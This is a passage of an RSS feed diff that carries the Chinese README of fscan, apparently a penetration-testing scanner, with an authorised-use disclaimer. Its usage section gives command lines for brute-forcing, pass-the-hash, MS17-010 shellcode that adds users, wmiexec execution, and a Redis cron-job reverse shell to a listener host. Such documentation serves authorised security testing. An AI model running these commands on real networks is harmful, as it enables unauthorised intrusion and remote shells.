+ <li>web漏洞扫描(weblogic、st2等,支持xray的poc)</li> 
+</ul> 
+<p>5.漏洞利用:</p> 
+<ul> 
+ <li>redis写公钥或写计划任务</li> 
+ <li>ssh命令执行</li> 
+ <li>ms17017利用(植入shellcode),如添加用户等</li> 
+</ul> 
+<p>6.其他功能:</p> 
+<ul> 
+ <li>文件保存</li> 
+</ul> 
+<h1>3. 使用说明</h1> 
+<p>简单用法</p> 
+<pre><code>fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
+fscan.exe -h 192.168.1.1/16  (B段扫描)
+</code></pre> 
+<p>其他用法</p> 
+<pre><code>fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
+fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
+fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)
+fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)
+fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)
+fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)
+fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) 
+fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )
+fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
+fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)
+fscan.exe -hf ip.txt  (以文件导入)
+fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)
+fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)
+fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)
+fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)
+fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)
+fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)
+fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)
+</code></pre> 
+<p>编译命令</p> 
+<pre><code>go build -ldflags="-s -w " -trimpath main.go
+upx -9 fscan.exe (可选,压缩体积)
+</code></pre> 
+<p>arch用户安装<br /> <code>yay -S fscan-git 或者 paru -S fscan-git</code></p> 
+<p>完整参数</p> 
+<pre><code>  -c string
+        ssh命令执行
+  -cookie string
+        设置cookie
+  -debug int
+        多久没响应,就打印当前进度(default 60)
+  -domain string
+        smb爆破模块时,设置域名
+  -h string
+        目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
+  -hf string
+        读取文件中的目标
+  -hn string
+        扫描时,要跳过的ip: -hn 192.168.1.1/24
+  -m string
+        设置扫描模式: -m ssh (default "all")
+  -no
+        扫描结果不保存到文件中
+  -nobr
+        跳过sql、ftp、ssh等的密码爆破
+  -nopoc
+        跳过web poc扫描
+  -np
+        跳过存活探测
+  -num int
+        web poc 发包速率  (default 20)
+  -o string
+        扫描结果保存到哪 (default "result.txt")
+  -p string
+        设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
+  -pa string
+        新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)
+  -path string
+        fcgi、smb romote file path
+  -ping
+        使用ping代替icmp进行存活探测
+  -pn string
+        扫描时要跳过的端口,as: -pn 445
+  -pocname string
+        指定web poc的模糊名字, -pocname weblogic
+  -proxy string
+        设置代理, -proxy http://127.0.0.1:8080
+  -user string
+        指定爆破时的用户名
+  -userf string
+        指定爆破时的用户名文件
+  -pwd string
+        指定爆破时的密码
+  -pwdf string
+        指定爆破时的密码文件
+  -rf string
+        指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)
+  -rs string
+        redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)
+  -silent
+        静默扫描,适合cs扫描时不回显
+  -sshkey string
+        ssh连接时,指定ssh私钥
+  -t int
+        扫描线程 (default 600)
+  -time int
+        端口扫描超时时间 (default 3)
+  -u string
+        指定Url扫描
+  -uf string
+        指定Url文件扫描
+  -wt int
+        web访问超时时间 (default 5)
+  -pocpath string
+        指定poc路径
+  -usera string
+        在原有用户字典基础上,新增新用户
+  -pwda string
+        在原有密码字典基础上,增加新密码
+  -socks5
+        指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)
+  -sc 
+        指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)
+</code></pre> 
+<h1>4. 运行截图</h1> 
+<p><code>fscan.exe -h 192.168.x.x (全功能、ms17010、读取网卡信息)</code> <img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/1.png" /></p> 
+<p><img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/4.png" /></p> 
+<p><code>fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)</code> <img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/2.png" /></p> 
+<p><code>fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)</code> <img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/3.png" /></p> 
+<p><code>fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc</code> <img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/2020-12-12-13-34-44.png" /></p> 
+<p><code>fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)</code> <img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/netbios.png" /></p> 
+<p><code>go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)</code> <img alt="" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/netbios1.png" /></p> 
+<p><code>go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)</code> <img alt="img.png" src="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/live.png" /></p> 
+<h1>5. 免责声明</h1> 
+<p>本工具仅面向<strong>合法授权</strong>的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。</p> 
+<p>为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。</p> 
+<p>在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。<strong>请勿对非授权目标进行扫描。</strong></p> 
+<p>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。</p> 
+<p>在安装并使用本工具前，请您<strong>务必审慎阅读、充分理解各条款内容</strong>，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p> 
+<h1>6. 404StarLink 2.0 - Galaxy</h1> 
+<p><img alt="" src="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png" /></p> 
+<p>fscan 是 404Team <a href="https://github.com/knownsec/404StarLink2.0-Galaxy">星链计划2.0</a> 中的一环，如果对fscan 有任何疑问又或是想要找小伙伴交流，可以参考星链计划的加群方式。</p> 
+<ul> 
+ <li><a href="https://github.com/knownsec/404StarLink2.0-Galaxy#community">https://github.com/knownsec/404StarLink2.0-Galaxy#community</a></li> 
+</ul> 
+<p>演示视频<a href="https://www.bilibili.com/video/BV1Cv4y1R72M">【安全工具】5大功能，一键化内网扫描神器——404星链计划fscan</a></p> 
+<h1>7. Star Chart</h1> 
+<p><a href="https://starchart.cc/shadow1ng/fscan"><img alt="Stargazers over time" src="https://starchart.cc/shadow1ng/fscan.svg?sanitize=true" /></a></p> 
+<h1>8. 捐赠</h1> 
+<p>如果你觉得这个项目对你有帮助，你可以请作者喝饮料🍹 <a href="https://raw.githubusercontent.com/shadow1ng/fscan/main/image/sponsor.png">点我</a></p> 
+<h1>9. 参考链接</h1> 
+<p><a href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a><br /> <a href="https://github.com/netxfly/x-crack">https://github.com/netxfly/x-crack</a><br /> <a href="https://github.com/hack2fun/Gscan">https://github.com/hack2fun/Gscan</a><br /> <a href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br /> <a href="https://github.com/jjf012/gopoc">https://github.com/jjf012/gopoc</a></p> 
+<h1>10. 最近更新</h1> 
+<p>[+] 2023/11/13 加入控制台颜色输出(可-nocolor)、保存文件json结构(-json)、修改tls最低版本为1.0、端口分组(-p db,web,service)。<br /> [+] 2022/11/19 加入hash碰撞、wmiexec无回显命令执行。<br /> [+] 2022/7/14 -hf 支持host:port和host/xx:port格式,rule.Search 正则匹配范围从body改成header+body,-nobr不再包含-nopoc.优化webtitle 输出格式。<br /> [+] 2022/7/6 加入手工gc回收,尝试节省无用内存。 -url 支持逗号隔开。 修复一个poc模块bug。-nobr不再包含-nopoc。<br /> [+] 2022/7/2 加强poc fuzz模块,支持跑备份文件、目录、shiro-key(默认跑10key,可用-full参数跑100key)等。新增ms17017利用(使用参数: -sc add),可在ms17010-exp.go自定义shellcode,内置添加用户等功能。<br /> 新增poc、指纹。支持socks5代理。因body指纹更全,默认不再跑ico图标。<br /> [+] 2022/4/20 poc模块加入指定目录或文件 -pocpath poc路径,端口可以指定文件-portf port.txt,rdp模块加入多线程爆破demo, -br xx指定线程。<br /> [+] 2022/2/25 新增-m webonly,跳过端口扫描,直接访问http。致谢@AgeloVito<br /> [+] 2022/1/11 新增oracle密码爆破。<br /> [+] 2022/1/7 扫ip/8时,默认会扫每个C段的网关和数个随机IP,推荐参数:-h ip/8 -m icmp.新增LiveTop功能,检测存活时,默认会输出top10的B、C段ip存活数量。<br /> [+] 2021/12/7 新增rdp扫描,新增添加端口参数-pa 3389(会在原有端口列表基础上,新增该端口)。<br /> [+] 2021/12/1 优化xray解析模块,支持groups、新增poc,加入https判断(tls握手包),优化ip解析模块(支持所有ip/xx),增加爆破关闭参数 -nobr,添加跳过某些ip扫描功能 -hn 192.168.1.1,添加跳过某些端口扫描功能-pn 21,445,增加扫描docker未授权漏洞。<br /> [+] 2021/6/18 改善一下poc的机制，如果识别出指纹会根据指纹信息发送poc，如果没有识别到指纹才会把所有poc打一遍。<br /> [+] 2021/5/29 加入fcgi协议未授权命令执行扫描,优化poc模块,优化icmp模块,ssh模块加入私钥连接。<br /> [+] 2021/5/15 新增win03版本(删减了xray_poc模块),增加-silent 静默扫描模式,添加web指纹,修复netbios模块数组越界,添加一个CheckErrs字典,webtitle 增加gzip解码。<br /> [+] 2021/5/6 更新mod库、poc、指纹。修改线程处理机制、netbios探测、域控识别模块、webtitle编码模块等。<br /> [+] 2021/4/22 修改webtitle模块,加入gbk解码。<br /> [+] 2021/4/21 加入netbios探测、域控识别。<br /> [+] 2021/3/4 支持-u url或者-uf url.txt,对url进行批量扫描。<br /> [+] 2021/2/25 修改yaml解析模块,支持密码爆破,如tomcat弱口令。yaml中新增sets参数,类型为数组,用于存放密码,具体看tomcat-manager-week.yaml。<br /> [+] 2021/2/8 增加指纹识别功能,可识别常见CMS、框架,如致远OA、通达OA等。<br /> [+] 2021/2/5 修改icmp发包模式,更适合大规模探测。<br /> 修改报错提示,-debug时,如果10秒内没有新的进展,每隔10秒就会打印一下当前进度。<br /> [+] 2020/12/12 已加入yaml解析引擎,支持xray的Poc,默认使用所有Poc(已对xray的poc进行了筛选),可以使用-pocname weblogic,只使用某种或某个poc。需要go版本1.16以上,只能自行编译最新版go来进行测试。<br /> [+] 2020/12/6 优化icmp模块,新增-domain 参数(用于smb爆破模块,适用于域用户) 。<br /> [+] 2020/12/03 优化ip段处理模块、icmp、端口扫描模块。新增支持192.168.1.1-192.168.255.255。<br /> [+] 2020/11/17 增加-ping 参数,作用是存活探测模块用ping代替icmp发包。<br /> [+] 2020/11/17 增加WebScan模块,新增shiro简单识别。https访问时,跳过证书认证。将服务模块和web模块的超时分开,增加-wt 参数(WebTimeout)。<br /> [+] 2020/11/16 对icmp模块进行优化,增加-it 参数(IcmpThreads),默认11000,适合扫B段 。<br /> [+] 2020/11/15 支持ip以文件导入,-hf ip.txt,并对去重做了处理。</p>
+]]></content:encoded>
+
+
+</item>
 
 <item>
 <title>ArduPilot/ardupilot</title>
